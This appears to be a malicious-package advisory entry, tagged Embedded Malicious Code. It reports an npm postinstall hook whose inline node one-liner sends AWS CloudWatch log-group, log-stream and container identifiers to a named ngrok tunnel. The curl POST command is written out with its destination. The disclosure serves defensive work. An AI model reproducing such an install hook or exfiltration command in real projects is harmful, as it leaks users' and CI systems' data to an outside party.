summary: postinstall exfiltrates piped input to attacker-controlled ngrok tunnel
details: package.json declares a postinstall script that runs an inline `node -e` one-liner reading from stdin, parsing JSON log-configuration objects (Name, LogOptions awslogs-group/awslogs-stream, Containers), and piping the result to `curl -X POST https://mourner-slot-explicit.ngrok-free.dev --data-binary @-`. The destination is a throwaway ngrok tunnel with no first-party relationship to any legitimate service, and the fetch runs automatically on `npm install`. The shape (install-time lifecycle hook + inline node script + curl to an anonymous tunnel + shipping installer/CI-supplied AWS CloudWatch log group/stream and container identifiers off-host) is a supply-chain exfiltration payload rather than any documented package behavior.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
